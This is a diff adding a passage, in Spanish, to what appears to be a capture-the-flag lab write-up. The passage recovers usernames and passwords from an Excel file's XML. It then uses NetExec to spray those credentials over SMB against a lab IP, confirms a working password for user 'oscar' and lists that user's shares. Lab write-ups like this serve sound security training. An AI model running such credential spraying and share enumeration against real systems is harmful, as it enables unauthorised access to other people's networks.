@@ -91,7 +91,24 @@ Al ser un comprimido lo descomprimimos para ver el contenido
 
 Y en el directorio `xl/sharedStrings.xml` al ver el archivo con un `cat` podremos ver el contenido del excel, de ahi obtenemos una lista de usuarios y contraseñas, verificamos cuales son validas
 
+```shell
+nxc smb 10.129.232.128 -u users.txt -p passwords.txt
+```
 
+Descubrimos el usuario
+```ad-hint
+oscar::86LxLBMgEWaKUnBG
+```
+
+Verificamos que el usuario es valido
+```shell
+nxc smb 10.129.232.128 -u 'oscar' -p '86LxLBMgEWaKUnBG'
+```
+
+Verificamos los recursos compartidos a los que tiene acceso
+```shell
+nxc smb 10.129.232.128 -u 'oscar' -p '86LxLBMgEWaKUnBG' --shares
+```
 
 
 
